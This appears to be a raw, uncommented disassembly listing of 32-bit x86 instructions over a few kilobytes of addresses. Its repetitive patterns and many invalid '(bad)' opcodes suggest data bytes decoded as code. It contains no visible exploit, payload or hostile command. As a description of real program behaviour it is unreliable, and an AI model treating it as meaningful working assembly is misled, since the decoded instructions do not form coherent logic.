  43fb9f:	add    BYTE PTR [eax],al
  43fba1:	xchg   esp,eax
  43fba2:	inc    DWORD PTR [eax]
  43fba4:	add    BYTE PTR [ecx-0x1],ah
  43fba7:	add    BYTE PTR [eax],al
  43fba9:	cmp    edi,edi
  43fbab:	add    BYTE PTR [eax],al
  43fbad:	and    eax,0x170000ff
  43fbb2:	inc    DWORD PTR [eax]
  43fbb4:	add    BYTE PTR [edx],dl
  43fbb6:	inc    DWORD PTR [eax]
  43fbb8:	add    BYTE PTR [esi],dl
  43fbba:	inc    DWORD PTR [eax]
  43fbbc:	add    BYTE PTR [edi],bl
  43fbbe:	inc    DWORD PTR [eax]
  43fbc0:	add    BYTE PTR [esi],ah
  43fbc2:	inc    DWORD PTR [eax]
  43fbc4:	add    BYTE PTR ds:0x200000ff,bl
  43fbca:	inc    DWORD PTR [eax]
  43fbcc:	add    BYTE PTR [eax],ah
  43fbce:	inc    DWORD PTR [eax]
  43fbd0:	add    BYTE PTR [ecx],ah
  43fbd2:	inc    DWORD PTR [eax]
  43fbd4:	add    BYTE PTR [edi],ah
  43fbd6:	inc    DWORD PTR [eax]
  43fbd8:	add    BYTE PTR [ecx],ch
  43fbda:	inc    DWORD PTR [eax]
  43fbdc:	add    BYTE PTR [edi],dh
  43fbde:	inc    DWORD PTR [eax]
  43fbe0:	add    BYTE PTR [edi-0x1],al
  43fbe3:	add    BYTE PTR [eax],al
  43fbe5:	outs   dx,BYTE PTR ds:[esi]
  43fbe6:	inc    DWORD PTR [eax]
  43fbe8:	add    BYTE PTR [ebp-0x1efffc01],bl
  43fbee:	(bad)  
  43fbef:	cmp    BYTE PTR [esi+0x7622ffdd],bl
  43fbf5:	in     eax,0xff
  43fbf7:	sbb    BYTE PTR [ebp*4-0x60c8e001],bl
  43fbfe:	jmp    DWORD PTR [ecx+ebp*1]
  43fc01:	imul   edi,edi,0x22
  43fc04:	sub    eax,0x3b1dff7f
  43fc09:	lods   eax,DWORD PTR ds:[esi]
  43fc0a:	call   DWORD PTR [esi]
  43fc0c:	xor    DWORD PTR [eax+0x772618ff],edx
  43fc12:	call   DWORD PTR [edx]
  43fc14:	xor    al,0xab
  43fc16:	call   FWORD PTR [ebx]
  43fc18:	ds stos BYTE PTR es:[edi],al
  43fc1a:	call   FWORD PTR [eax]
  43fc1c:	cs cwde 
  43fc1e:	jmp    DWORD PTR [edx]
  43fc20:	jns    0x43fbfe
  43fc22:	inc    DWORD PTR [eax-0x3a]
  43fc25:	(bad)  
  43fc26:	inc    DWORD PTR [eax]
  43fc28:	add    bl,bl
  43fc2a:	inc    DWORD PTR [eax]
  43fc2c:	add    BYTE PTR [ecx+0x530000ff],al
  43fc32:	inc    DWORD PTR [eax]
  43fc34:	add    BYTE PTR [ecx],dh
  43fc36:	inc    DWORD PTR [eax]
  43fc38:	add    BYTE PTR [edi],ah
  43fc3a:	inc    DWORD PTR [eax]
  43fc3c:	add    BYTE PTR [edi+edi*8],ch
  43fc3f:	add    BYTE PTR [eax],al
  43fc41:	sbb    edi,edi
  43fc43:	add    BYTE PTR [eax],al
  43fc45:	and    bh,bh
  43fc47:	add    BYTE PTR [eax],al
  43fc49:	sbb    eax,0x1b0000ff
  43fc4e:	inc    DWORD PTR [eax]
  43fc50:	add    BYTE PTR [ebx],bl
  43fc52:	inc    DWORD PTR [eax]
  43fc54:	add    BYTE PTR [edx],bl
  43fc56:	inc    DWORD PTR [eax]
  43fc58:	add    BYTE PTR ds:0x220000ff,bl
  43fc5e:	inc    DWORD PTR [eax]
  43fc60:	add    BYTE PTR ds:0x2e0000ff,ch
  43fc66:	inc    DWORD PTR [eax]
  43fc68:	add    BYTE PTR [ebx],ch
  43fc6a:	inc    DWORD PTR [eax]
  43fc6c:	add    BYTE PTR [esi],ch
  43fc6e:	inc    DWORD PTR [eax]
  43fc70:	add    BYTE PTR [edx-0x1],al
  43fc73:	add    BYTE PTR [eax],al
  43fc75:	pop    eax
  43fc76:	inc    DWORD PTR [eax]
  43fc78:	add    BYTE PTR [edi-0x1],bh
  43fc7b:	add    cl,BYTE PTR [edi]
  43fc7d:	in     eax,0xff
  43fc7f:	add    edx,DWORD PTR [edi]
  43fc81:	(bad)  
  43fc83:	or     DWORD PTR [edx],edx
  43fc85:	cdq    
  43fc86:	inc    DWORD PTR [eax]
  43fc88:	push   es
  43fc89:	lods   al,BYTE PTR ds:[esi]
  43fc8a:	call   DWORD PTR [edi]
  43fc8c:	and    BYTE PTR [ebp+0x532f1aff],al
  43fc92:	inc    DWORD PTR [ecx]
  43fc94:	and    al,0x7c
  43fc96:	inc    DWORD PTR ds:0x19ff8418
  43fc9c:	pop    ds
  43fc9d:	pop    ebp
  43fc9e:	dec    DWORD PTR [ebx]
  43fca0:	push   ss
  43fca1:	popa   
  43fca2:	call   FWORD PTR [ecx]
  43fca4:	and    DWORD PTR [edi+edi*8+0x22],ebp
  43fca8:	inc    edx
  43fca9:	mov    bh,bh
  43fcab:	pop    ds
  43fcac:	dec    ebp
  43fcad:	test   eax,0xfb0600ff
  43fcb2:	inc    DWORD PTR [eax]
  43fcb4:	add    BYTE PTR [esi+0x6f0000ff],ah
  43fcba:	inc    DWORD PTR [eax]
  43fcbc:	add    BYTE PTR [ebx-0x1],al
  43fcbf:	add    BYTE PTR [eax],al
  43fcc1:	xor    edi,edi
  43fcc3:	add    BYTE PTR [eax],al
  43fcc5:	pop    ds
  43fcc6:	inc    DWORD PTR [eax]
  43fcc8:	add    BYTE PTR [ecx],bl
  43fcca:	inc    DWORD PTR [eax]
  43fccc:	add    BYTE PTR [ecx],bl
  43fcce:	inc    DWORD PTR [eax]
  43fcd0:	add    BYTE PTR [edi+edi*8],bl
  43fcd3:	add    BYTE PTR [eax],al
  43fcd5:	sbb    al,0xff
  43fcd7:	add    BYTE PTR [eax],al
  43fcd9:	sbb    eax,0xb0000ff
  43fcde:	inc    DWORD PTR [eax]
  43fce0:	add    BYTE PTR [edx],bl
  43fce2:	inc    DWORD PTR [eax]
  43fce4:	add    BYTE PTR [edi],bl
  43fce6:	inc    DWORD PTR [eax]
  43fce8:	add    BYTE PTR [edi],dh
  43fcea:	inc    DWORD PTR [eax]
  43fcec:	add    BYTE PTR [edx-0x1],ah
  43fcef:	add    BYTE PTR [eax],al
  43fcf1:	xchg   bh,bh
  43fcf3:	adc    ebx,DWORD PTR [ecx-0x22]
  43fcf6:	dec    DWORD PTR [edi]
  43fcf8:	adc    eax,0x2717ffc6
  43fcfd:	cmp    edi,0xf
  43fd00:	and    eax,0x2a11ff8f
  43fd05:	mov    ecx,0x9e2a11ff
  43fd0a:	dec    DWORD PTR [ebx]
  43fd0c:	sbb    ch,BYTE PTR [ebp-0x1]
  43fd0f:	push   cs
  43fd10:	and    DWORD PTR [ecx-0x1],esi
  43fd13:	adc    ah,BYTE PTR [ecx]
  43fd15:	popa   
  43fd16:	call   DWORD PTR [eax]
  43fd18:	sub    DWORD PTR [esi+0x601a0dff],ecx
  43fd1e:	dec    DWORD PTR [edi]
  43fd20:	cvttps2pi mm7,xmm7
  43fd23:	add    al,BYTE PTR [eax]
  43fd25:	sbb    bh,bh
  43fd27:	and    esp,DWORD PTR [edi+edi*8-0x1]
  43fd2b:	jae    0x43fd25
  43fd2d:	(bad)  
  43fd2e:	dec    DWORD PTR [edi]
  43fd30:	pop    ds
  43fd31:	sar    edi,cl
  43fd33:	add    BYTE PTR [eax],al
  43fd35:	cmp    bh,0x0
  43fd38:	add    BYTE PTR [ecx-0x1],dl
  43fd3b:	add    BYTE PTR [eax],al
  43fd3d:	xor    bh,bh
  43fd3f:	add    BYTE PTR [eax],al
  43fd41:	push   ss
  43fd42:	inc    DWORD PTR [eax]
  43fd44:	add    BYTE PTR [edi],cl
  43fd46:	inc    DWORD PTR [eax]
  43fd48:	add    BYTE PTR [esi],cl
  43fd4a:	inc    DWORD PTR [eax]
  43fd4c:	add    BYTE PTR [edx],cl
  43fd4e:	inc    DWORD PTR [eax]
  43fd50:	add    BYTE PTR [esi],dl
  43fd52:	inc    DWORD PTR [eax]
  43fd54:	add    BYTE PTR [edx],dh
  43fd56:	inc    DWORD PTR [eax]
  43fd58:	add    BYTE PTR [esi-0x1],dl
  43fd5b:	add    BYTE PTR [eax],al
  43fd5d:	mov    edi,?
  43fd5f:	adc    esp,DWORD PTR [edi]
  43fd61:	retf   0x1fff
  43fd64:	aaa    
  43fd65:	stos   BYTE PTR es:[edi],al
  43fd66:	jmp    DWORD PTR [esi]
  43fd68:	push   edx
  43fd69:	aam    0xff
  43fd6b:	and    ecx,DWORD PTR [edx-0x23]
  43fd6e:	call   DWORD PTR [ebx]
  43fd70:	das    
  43fd71:	enter  0x3ff,0x20
  43fd75:	(bad)  
  43fd77:	add    BYTE PTR [eax],dl
  43fd79:	loop   0x43fd7a
  43fd7b:	pop    es
  43fd7c:	or     eax,0x2e1bff67
  43fd81:	push   esi
  43fd82:	push   DWORD PTR [eax]
  43fd84:	ins    DWORD PTR es:[edi],dx
  43fd85:	ret    
  43fd86:	jmp    DWORD PTR [esp+esi*1]
  43fd89:	jbe    0x43fd8a
  43fd8b:	and    DWORD PTR [ebx],esi
  43fd8d:	js     0x43fd8e
  43fd8f:	adc    dl,BYTE PTR [ebx]
  43fd91:	notrack call DWORD PTR [eax]
  43fd94:	sub    DWORD PTR [edi+edi*8-0xc0ee],esp
  43fd9b:	add    DWORD PTR [eax+eiz*8],ecx
  43fd9e:	inc    DWORD PTR [eax]
  43fda0:	add    BYTE PTR [ecx+0x5d0000ff],dl
  43fda6:	inc    DWORD PTR [eax]
  43fda8:	add    BYTE PTR [edx],bh
  43fdaa:	inc    DWORD PTR [eax]
  43fdac:	add    BYTE PTR [edi],ah
  43fdae:	inc    DWORD PTR [eax]
  43fdb0:	add    BYTE PTR [ecx],ah
  43fdb2:	inc    DWORD PTR [eax]
  43fdb4:	add    BYTE PTR [edi+edi*8],dl
  43fdb7:	add    BYTE PTR [eax],al
  43fdb9:	pop    ss
  43fdba:	inc    DWORD PTR [eax]
  43fdbc:	add    BYTE PTR [eax],ah
  43fdbe:	inc    DWORD PTR [eax]
  43fdc0:	add    BYTE PTR [edx],dh
  43fdc2:	inc    DWORD PTR [eax]
  43fdc4:	add    BYTE PTR [eax],ah
  43fdc6:	inc    DWORD PTR [eax]
  43fdc8:	add    BYTE PTR [ecx],ch
  43fdca:	inc    DWORD PTR [eax]
  43fdcc:	add    BYTE PTR [edx],dh
  43fdce:	inc    DWORD PTR [eax]
  43fdd0:	add    BYTE PTR [edi],dh
  43fdd2:	inc    DWORD PTR [eax]
  43fdd4:	add    BYTE PTR [edi],dh
  43fdd6:	inc    DWORD PTR [eax]
  43fdd8:	add    BYTE PTR [ecx],bh
  43fdda:	inc    DWORD PTR [eax]
  43fddc:	add    BYTE PTR [ebp-0x1],cl
  43fddf:	add    BYTE PTR [eax],al
  43fde1:	inc    DWORD PTR gs:[eax]
  43fde4:	add    BYTE PTR [edi+edi*8-0x2dfc00],cl
  43fdeb:	pop    es
  43fdec:	add    al,0xe4
  43fdee:	inc    DWORD PTR [eax-0x55]
  43fdf1:	out    0xff,al
  43fdf3:	cmp    BYTE PTR [esi+0x1414fff0],dh
  43fdf9:	xchg   ecx,eax
  43fdfa:	call   FWORD PTR ds:0x2cffb93c
  43fe00:	ds fwait
  43fe02:	call   FWORD PTR [edi]
  43fe04:	and    esp,DWORD PTR [edx-0x1]
  43fe07:	sbb    esp,DWORD PTR ds:0x3a17ff71
  43fe0d:	test   eax,0x81321dff
  43fe12:	call   DWORD PTR [esi]
  43fe14:	cs xchg ecx,eax
  43fe16:	call   DWORD PTR [edi]
  43fe18:	cmp    eax,0x481effb1
  43fe1d:	mov    ebp,0x77190eff
  43fe22:	(bad)  
  43fe23:	cmp    al,0xa5
  43fe25:	fdivr  st,st(7)
  43fe27:	push   es
  43fe28:	or     al,0xfa
  43fe2a:	inc    DWORD PTR [eax]
  43fe2c:	add    BYTE PTR [ebx+0x630000ff],dl
  43fe32:	inc    DWORD PTR [eax]
  43fe34:	add    BYTE PTR [eax-0x1],al
  43fe37:	add    BYTE PTR [eax],al
  43fe39:	and    eax,0x230000ff
  43fe3e:	inc    DWORD PTR [eax]
  43fe40:	add    BYTE PTR [edi+edi*8],bl
  43fe43:	add    BYTE PTR [eax],al
  43fe45:	and    al,0xff
  43fe47:	add    BYTE PTR [eax],al
  43fe49:	and    edi,edi
  43fe4b:	add    BYTE PTR [eax],al
  43fe4d:	sbb    edi,edi
  43fe4f:	add    BYTE PTR [eax],al
  43fe51:	and    bh,bh
  43fe53:	add    BYTE PTR [eax],al
  43fe55:	daa    
  43fe56:	inc    DWORD PTR [eax]
  43fe58:	add    BYTE PTR [esi],bl
  43fe5a:	inc    DWORD PTR [eax]
  43fe5c:	add    BYTE PTR [ecx],bl
  43fe5e:	inc    DWORD PTR [eax]
  43fe60:	add    BYTE PTR [ecx],ah
  43fe62:	inc    DWORD PTR [eax]
  43fe64:	add    BYTE PTR [edi+edi*8],bl
  43fe67:	add    BYTE PTR [eax],al
  43fe69:	sub    edi,edi
  43fe6b:	add    BYTE PTR [eax],al
  43fe6d:	and    al,0xff
  43fe6f:	add    BYTE PTR [eax],al
  43fe71:	xor    bh,bh
  43fe73:	add    BYTE PTR [eax],al
  43fe75:	dec    esp
  43fe76:	inc    DWORD PTR [eax]
  43fe78:	add    BYTE PTR [edx-0x1],ch
  43fe7b:	add    BYTE PTR [ecx],al
  43fe7d:	xchg   esp,eax
  43fe7e:	inc    DWORD PTR [edx]
  43fe80:	or     ch,bl
  43fe82:	inc    DWORD PTR [edi]
  43fe84:	and    ebx,ebx
  43fe86:	call   FWORD PTR [ecx]
  43fe88:	xor    DWORD PTR [ebx-0x61deec01],ecx
  43fe8e:	dec    DWORD PTR [edx]
  43fe90:	adc    eax,0x1e12ffac
  43fe95:	test   bh,bh
  43fe97:	sbb    al,0x41
  43fe99:	xchg   edx,eax
  43fe9a:	jmp    FWORD PTR [ecx]
  43fe9c:	push   ecx
  43fe9d:	mov    eax,ds:0x5c2113ff
  43fea2:	call   DWORD PTR [ecx]
  43fea4:	pop    ds
  43fea5:	push   0x934520ff
  43feaa:	call   FWORD PTR [esi+eax*2]
  43fead:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43feae:	inc    DWORD PTR [eax]
  43feb0:	pop    es
  43feb1:	cld    
  43feb2:	inc    DWORD PTR [eax]
  43feb4:	add    BYTE PTR [ebp+0x710000ff],ah
  43feba:	inc    DWORD PTR [eax]
  43febc:	add    BYTE PTR [ebx-0x1],cl
  43febf:	add    BYTE PTR [eax],al
  43fec1:	sub    edi,edi
  43fec3:	add    BYTE PTR [eax],al
  43fec5:	pop    ss
  43fec6:	inc    DWORD PTR [eax]
  43fec8:	add    BYTE PTR ds:0x240000ff,bl
  43fece:	inc    DWORD PTR [eax]
  43fed0:	add    BYTE PTR [eax],bl
  43fed2:	inc    DWORD PTR [eax]
  43fed4:	add    BYTE PTR [esi],dl
  43fed6:	inc    DWORD PTR [eax]
  43fed8:	add    BYTE PTR [edi],bl
  43feda:	inc    DWORD PTR [eax]
  43fedc:	add    BYTE PTR [edi],dl
  43fede:	inc    DWORD PTR [eax]
  43fee0:	add    BYTE PTR [edi],bl
  43fee2:	inc    DWORD PTR [eax]
  43fee4:	add    BYTE PTR [ebx],bl
  43fee6:	inc    DWORD PTR [eax]
  43fee8:	add    BYTE PTR [edi+edi*8],dh
  43feeb:	add    BYTE PTR [eax],al
  43feed:	push   ebp
  43feee:	inc    DWORD PTR [eax]
  43fef0:	add    BYTE PTR [edi-0x1],bh
  43fef3:	or     al,0x3d
  43fef5:	(bad)  
  43fef6:	inc    DWORD PTR [edi]
  43fef8:	sbb    al,0xe3
  43fefa:	inc    DWORD PTR [edi]
  43fefc:	push   ss
  43fefd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43fefe:	dec    DWORD PTR [esi]
  43ff00:	adc    DWORD PTR [edi+edi*8+0x11],ebx
  43ff04:	and    ecx,DWORD PTR [ebx-0x65daf001]
  43ff0a:	call   FWORD PTR [ecx]
  43ff0c:	es jp  0x43ff0e
  43ff0f:	adc    BYTE PTR [ebx],dl
  43ff11:	inc    edx
  43ff12:	call   DWORD PTR [eax]
  43ff14:	sbb    eax,0x280dff5c
  43ff19:	xchg   edx,eax
  43ff1a:	dec    DWORD PTR [edi]
  43ff1c:	pop    ds
  43ff1d:	jo     0x43ff1e
  43ff1f:	push   cs
  43ff20:	sbb    DWORD PTR [edi-0x1],edx
  43ff23:	or     eax,0x21ff1704
  43ff28:	xor    BYTE PTR [esi-0x1],bh
  43ff2b:	cmp    ch,BYTE PTR [ecx+ebx*8-0x1]
  43ff2f:	adc    ah,BYTE PTR [edx+ebp*8]
  43ff32:	inc    DWORD PTR [eax]
  43ff34:	add    BYTE PTR [eax+0x540000ff],cl
  43ff3a:	inc    DWORD PTR [eax]
  43ff3c:	add    BYTE PTR [ebx],dh
  43ff3e:	inc    DWORD PTR [eax]
  43ff40:	add    BYTE PTR [edx],bl
  43ff42:	inc    DWORD PTR [eax]
  43ff44:	add    BYTE PTR [edi+edi*8],cl
  43ff47:	add    BYTE PTR [eax],al
  43ff49:	or     eax,0x140000ff
  43ff4e:	inc    DWORD PTR [eax]
  43ff50:	add    BYTE PTR [edi+edi*8],bl
  43ff53:	add    BYTE PTR [eax],al
  43ff55:	xor    al,0xff
  43ff57:	add    BYTE PTR [eax],al
  43ff59:	push   ebx
  43ff5a:	inc    DWORD PTR [eax]
  43ff5c:	add    BYTE PTR [eax-0x52e1ef01],cl
  43ff62:	call   FWORD PTR [ebx]
  43ff64:	xor    ah,BYTE PTR [edi+edi*8-0x28b6df]
  43ff6b:	and    al,0x51
  43ff6d:	int3   
  43ff6e:	inc    DWORD PTR ds:0x3ff902b
  43ff74:	push   cs
  43ff75:	mov    esp,0xe10600ff
  43ff7a:	inc    DWORD PTR [eax]
  43ff7c:	sbb    ah,bl
  43ff7e:	dec    DWORD PTR [eax]
  43ff80:	adc    BYTE PTR [eax-0x1],ch
  43ff83:	pop    ds
  43ff84:	ss pop edx
  43ff86:	call   FWORD PTR ds:0x1cffa13c
  43ff8c:	sub    dh,BYTE PTR [ebx-0x1]
  43ff8f:	sbb    DWORD PTR [ebx],esp
  43ff91:	push   ecx
  43ff92:	call   FWORD PTR [edx+esi*1]
  43ff95:	imul   edi,edi,0xffd64d26
  43ff9b:	add    BYTE PTR [edx+ebx*8],cl
  43ff9e:	inc    DWORD PTR [eax]
  43ffa0:	add    BYTE PTR [ecx+0x570000ff],cl
  43ffa6:	inc    DWORD PTR [eax]
  43ffa8:	add    BYTE PTR ds:0x220000ff,dh
  43ffae:	inc    DWORD PTR [eax]
  43ffb0:	add    BYTE PTR [edi],bl
  43ffb2:	inc    DWORD PTR [eax]
  43ffb4:	add    BYTE PTR [ecx],bl
  43ffb6:	inc    DWORD PTR [eax]
  43ffb8:	add    BYTE PTR [edx],ah
  43ffba:	inc    DWORD PTR [eax]
  43ffbc:	add    BYTE PTR [ebx],ah
  43ffbe:	inc    DWORD PTR [eax]
  43ffc0:	add    BYTE PTR [eax],ch
  43ffc2:	inc    DWORD PTR [eax]
  43ffc4:	add    BYTE PTR ds:0x3d0000ff,dh
  43ffca:	inc    DWORD PTR [eax]
  43ffcc:	add    BYTE PTR [ebp-0x1],al
  43ffcf:	add    BYTE PTR [eax],al
  43ffd1:	push   eax
  43ffd2:	inc    DWORD PTR [eax]
  43ffd4:	add    BYTE PTR [edi-0x1],dl
  43ffd7:	add    BYTE PTR [eax],al
  43ffd9:	pusha  
  43ffda:	inc    DWORD PTR [eax]
  43ffdc:	add    BYTE PTR [edx-0x1],dh
  43ffdf:	add    BYTE PTR [eax],al
  43ffe1:	(bad)  
  43ffe2:	inc    DWORD PTR [eax]
  43ffe4:	add    dh,BYTE PTR [edi-0x2befff01]
  43ffea:	inc    DWORD PTR [ebx]
  43ffec:	or     ch,dl
  43ffee:	push   DWORD PTR [edx]
  43fff0:	outs   dx,DWORD PTR ds:[esi]
  43fff1:	sar    edi,1
  43fff3:	sub    ah,BYTE PTR [ebp-0x36]
  43fff6:	call   DWORD PTR ds:0x16ffbe25
  43fffc:	and    eax,0x382cff86
  440001:	mov    bh,bh
  440003:	and    ch,BYTE PTR [edx]
  440005:	jne    0x440006
  440007:	push   ds
  440008:	and    DWORD PTR [ebp-0x1],esp
  44000b:	adc    ah,BYTE PTR [ebx]
  44000d:	jo     0x44000e
  44000f:	sbb    DWORD PTR [ecx],edi
  440011:	sahf   
  440012:	call   FWORD PTR [eax]
  440014:	and    al,0x70
  440016:	call   DWORD PTR [esp+ebp*1]
  440019:	cmp    bh,0x1b
  44001c:	cmp    eax,0x3c13ffaa
  440021:	mov    ecx,0xb54726ff
  440026:	inc    DWORD PTR [ecx]
  440028:	add    dh,dh
  44002a:	inc    DWORD PTR [eax]
  44002c:	add    BYTE PTR [edx+0x6f0000ff],ah
  440032:	inc    DWORD PTR [eax]
  440034:	add    BYTE PTR [ecx-0x1],cl
  440037:	add    BYTE PTR [eax],al
  440039:	sub    bh,bh
  44003b:	add    BYTE PTR [eax],al
  44003d:	and    bh,bh
  44003f:	add    BYTE PTR [eax],al
  440041:	sbb    eax,0x1b0000ff
  440046:	inc    DWORD PTR [eax]
  440048:	add    BYTE PTR [ebx],bl
  44004a:	inc    DWORD PTR [eax]
  44004c:	add    BYTE PTR ds:0x170000ff,bl
  440052:	inc    DWORD PTR [eax]
  440054:	add    BYTE PTR [edi+edi*8],bl
  440057:	add    BYTE PTR [eax],al
  440059:	push   ss
  44005a:	inc    DWORD PTR [eax]
  44005c:	add    BYTE PTR [ebx],bl
  44005e:	inc    DWORD PTR [eax]
  440060:	add    BYTE PTR [edi+edi*8],ah
  440063:	add    BYTE PTR [eax],al
  440065:	adc    al,0xff
  440067:	add    BYTE PTR [eax],al
  440069:	push   ss
  44006a:	inc    DWORD PTR [eax]
  44006c:	add    BYTE PTR ds:0x2d0000ff,bl
  440072:	inc    DWORD PTR [eax]
  440074:	add    BYTE PTR [esi],bh
  440076:	inc    DWORD PTR [eax]
  440078:	add    BYTE PTR [eax-0x1],dl
  44007b:	add    BYTE PTR [eax],al
  44007d:	jbe    0x44007e
  44007f:	add    BYTE PTR [eax],al
  440081:	mov    eax,ds:0xdd1603ff
  440086:	dec    DWORD PTR ds:0x12ffc923
  44008c:	cmp    eax,0x3e19ffd2
  440091:	lods   eax,DWORD PTR ds:[esi]
  440092:	dec    DWORD PTR [eax+ebx*1]
  440095:	xchg   ebp,eax
  440096:	call   DWORD PTR ds:0x29ffad1a
  44009c:	dec    ebp
  44009d:	mov    esp,0x9c5228ff
  4400a2:	call   DWORD PTR [edx]
  4400a4:	and    DWORD PTR [edx-0x1],edx
  4400a7:	push   ds
  4400a8:	xor    eax,0x2f0cff78
  4400ad:	xchg   bh,bh
  4400af:	add    BYTE PTR [eax],cl
  4400b1:	cld    
  4400b2:	inc    DWORD PTR [eax]
  4400b4:	add    BYTE PTR [ebp+0x680000ff],ah
  4400ba:	inc    DWORD PTR [eax]
  4400bc:	add    BYTE PTR [edi-0x1],al
  4400bf:	add    BYTE PTR [eax],al
  4400c1:	sub    bh,bh
  4400c3:	add    BYTE PTR [eax],al
  4400c5:	pop    ss
  4400c6:	inc    DWORD PTR [eax]
  4400c8:	add    BYTE PTR [ebx],ah
  4400ca:	inc    DWORD PTR [eax]
  4400cc:	add    BYTE PTR [edx],ah
  4400ce:	inc    DWORD PTR [eax]
  4400d0:	add    BYTE PTR [edi],dl
  4400d2:	inc    DWORD PTR [eax]
  4400d4:	add    BYTE PTR [eax],bl
  4400d6:	inc    DWORD PTR [eax]
  4400d8:	add    BYTE PTR [esi],dl
  4400da:	inc    DWORD PTR [eax]
  4400dc:	add    BYTE PTR [eax],bl
  4400de:	inc    DWORD PTR [eax]
  4400e0:	add    BYTE PTR [edi],dl
  4400e2:	inc    DWORD PTR [eax]
  4400e4:	add    BYTE PTR [edx],ah
  4400e6:	inc    DWORD PTR [eax]
  4400e8:	add    BYTE PTR [esi],ch
  4400ea:	inc    DWORD PTR [eax]
  4400ec:	add    BYTE PTR [esi-0x1],cl
  4400ef:	add    BYTE PTR [eax],al
  4400f1:	jbe    0x4400f2
  4400f3:	add    BYTE PTR [ebx+ecx*8],cl
  4400f6:	inc    DWORD PTR [ebx]
  4400f8:	sbb    bh,cl
  4400fa:	inc    DWORD PTR [edi]
  4400fc:	or     eax,0xb0bffa4
  440101:	ins    DWORD PTR es:[edi],dx
  440102:	dec    DWORD PTR [esp+edx*1]
  440105:	outs   dx,BYTE PTR ds:[esi]
  440106:	dec    DWORD PTR [edi]
  440108:	and    bh,BYTE PTR [ecx-0x1]
  44010b:	sbb    esp,DWORD PTR [esi]
  44010d:	arpl   di,di
  44010f:	push   cs
  440110:	adc    DWORD PTR ds:0x3f0e0bff,esi
  440116:	dec    DWORD PTR [ebx]
  440118:	sbb    dh,BYTE PTR [ecx-0x1]
  44011b:	push   cs
  44011c:	sbb    bh,BYTE PTR [ecx-0x1]
  44011f:	adc    DWORD PTR [edi],ebx
  440121:	(bad)  
  440122:	call   DWORD PTR [edi]
  440124:	sbb    eax,0x111fff68
  440129:	cmp    al,0xff
  44012b:	ss push 0x3015ffdf
  440131:	out    dx,al
  440132:	inc    DWORD PTR [eax]
  440134:	add    BYTE PTR [edi+edi*8-0xa80000],cl
  44013b:	add    BYTE PTR [eax],al
  44013d:	sub    eax,0x1a0000ff
  440142:	inc    DWORD PTR [eax]
  440144:	add    BYTE PTR [edi],cl
  440146:	inc    DWORD PTR [eax]
  440148:	add    BYTE PTR [edx],cl
  44014a:	inc    DWORD PTR [eax]
  44014c:	add    BYTE PTR [eax],dl
  44014e:	inc    DWORD PTR [eax]
  440150:	add    BYTE PTR [edi+edi*8],dl
  440153:	add    BYTE PTR [eax],al
  440155:	inc    DWORD PTR cs:[eax]
  440158:	add    BYTE PTR [edi+edi*8+0x0],dl
  44015c:	add    BYTE PTR [eax-0x55f6f901],cl
  440162:	call   DWORD PTR [esi]
  440164:	sub    eax,esi
  440166:	call   FWORD PTR [ebx]
  440168:	cmp    bl,ah
  44016a:	call   FWORD PTR [eax+edi*1]
  44016d:	cdq    
  44016e:	inc    DWORD PTR [esi]
  440170:	pop    es
  440171:	xor    edi,edi
  440173:	add    BYTE PTR [eax],dl
  440175:	xchg   bh,bh
  440177:	add    BYTE PTR [ebp*4-0x9e0ff01],al
  44017e:	inc    DWORD PTR [ecx]
  440180:	sbb    al,0xde
  440182:	dec    DWORD PTR [edx]
  440184:	adc    eax,0x291cff61
  440189:	inc    edi
  44018a:	jmp    DWORD PTR [edx]
  44018c:	cmp    bh,BYTE PTR [ebp-0x1]
  44018f:	adc    bl,BYTE PTR [edx]
  440191:	inc    ebx
  440192:	call   FWORD PTR [ebx]
  440194:	and    dl,BYTE PTR [ebx-0x1]
  440197:	pop    ds
  440198:	dec    edx
  440199:	sar    edi,cl
  44019b:	add    BYTE PTR [edx],dl
  44019d:	out    0xff,al
  44019f:	add    BYTE PTR [eax],al
  4401a1:	mov    bh,bh
  4401a3:	add    BYTE PTR [eax],al
  4401a5:	push   esi
  4401a6:	inc    DWORD PTR [eax]
  4401a8:	add    BYTE PTR [eax],dh
  4401aa:	inc    DWORD PTR [eax]
  4401ac:	add    BYTE PTR [ebx],bl
  4401ae:	inc    DWORD PTR [eax]
  4401b0:	add    BYTE PTR [eax],dl
  4401b2:	inc    DWORD PTR [eax]
  4401b4:	add    BYTE PTR [eax],dl
  4401b6:	inc    DWORD PTR [eax]
  4401b8:	add    BYTE PTR [ecx],bl
  4401ba:	inc    DWORD PTR [eax]
  4401bc:	add    BYTE PTR [ecx],ch
  4401be:	inc    DWORD PTR [eax]
  4401c0:	add    BYTE PTR [ebx],dh
  4401c2:	inc    DWORD PTR [eax]
  4401c4:	add    BYTE PTR [ebx-0x1],cl
  4401c7:	add    BYTE PTR [eax],al
  4401c9:	(bad)  
  4401ca:	inc    DWORD PTR [eax]
  4401cc:	add    BYTE PTR [edi+edi*8+0x0],ch
  4401d0:	add    BYTE PTR [edx-0x1],bh
  4401d3:	add    BYTE PTR [eax],al
  4401d5:	cmp    edi,0xff910000
  4401db:	add    BYTE PTR [eax],al
  4401dd:	lahf   
  4401de:	inc    DWORD PTR [eax]
  4401e0:	add    bh,BYTE PTR [edi+edi*8-0x31f800]
  4401e7:	add    edx,DWORD PTR [ebx+ecx*8]
  4401ea:	inc    DWORD PTR [eax]
  4401ec:	or     esi,eax
  4401ee:	push   DWORD PTR [eax]
  4401f0:	push   ebp
  4401f1:	mov    ebx,0xbf5d33ff
  4401f6:	call   FWORD PTR [eax]
  4401f8:	cs mov dl,0xff
  4401fb:	sub    BYTE PTR [ebp+ebx*4-0x1],al
  4401ff:	cmp    DWORD PTR [eax-0x74],ecx
  440202:	jmp    FWORD PTR [eax]
  440204:	sub    ebp,DWORD PTR [edi+edi*8+0x22]
  440208:	and    al,0x5c
  44020a:	call   FWORD PTR [ecx]
  44020c:	push   ds
  44020d:	call   DWORD PTR fs:[esi]
  440210:	sub    BYTE PTR [ebx-0x1],bh
  440213:	sbb    al,0x3c
  440215:	mov    dl,0xff
  440217:	sbb    BYTE PTR [ebx],bh
  440219:	mov    al,0xff
  44021b:	sbb    BYTE PTR [edi],ch
  44021d:	cmp    bh,0x14
  440220:	xor    edx,DWORD PTR [ebx-0x3cb9e501]
  440226:	inc    DWORD PTR [eax]
  440228:	add    bh,ah
  44022a:	inc    DWORD PTR [eax]
  44022c:	add    BYTE PTR [eax+0x690000ff],ch
  440232:	inc    DWORD PTR [eax]
